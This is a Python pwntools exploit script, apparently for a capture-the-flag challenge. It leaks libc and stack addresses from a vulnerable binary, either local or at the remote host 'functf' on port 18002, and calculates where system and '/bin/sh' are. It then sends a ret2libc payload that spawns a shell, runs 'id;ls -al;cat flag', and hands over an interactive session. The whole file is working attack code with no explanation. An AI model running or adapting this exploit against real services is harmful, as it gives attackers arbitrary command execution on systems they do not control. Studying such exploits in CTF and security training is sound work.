from pwn import *

if len(sys.argv)==1:
    libc_elf=ELF("/lib/i386-linux-gnu/libc.so.6")
    p=process("linux_server")
elif sys.argv[1]=="1":
    libc_elf=ELF("/lib/i386-linux-gnu/libc.so.6")
    p=process("./bin")
elif sys.argv[1]=="2":
    libc_elf=ELF("/lib/i386-linux-gnu/libc.so.6")
    context.log_level='debug'
    p=process("./bin")
    print p.pid
    pause()
elif sys.argv[1]=="3":
    libc_elf=ELF("../r32.libc.so.6")
    p=remote("functf",18002)

buf=p.recvuntil("Input :")
print hexdump(buf)
libc_puts = int(buf[0x3d:0x3d+8],16)
stack_addr = int(buf[0x2c:0x2c+8],16)
print 'libc_puts:',hex(libc_puts)
print 'stack_addr:',hex(stack_addr)
libc_base = libc_puts - libc_elf.sym["puts"]
libc_system = libc_base + libc_elf.sym["system"]
libc_bin_sh = libc_base + libc_elf.search("/bin/sh").next()
print 'libc_base:',hex(libc_base)
print 'libc_system:',hex(libc_system)
print 'libc_bin_sh:',hex(libc_bin_sh)

payload=""
payload+=p32(libc_system)
payload+=p32(0xdeadbeef)
payload+=p32(libc_bin_sh)
payload+=p32(stack_addr+4)
payload+=p32(stack_addr+4)
payload+=p32(stack_addr+4)

p.sendline(payload)

sleep(1)

p.sendline("id;ls -al;cat flag")

p.interactive()
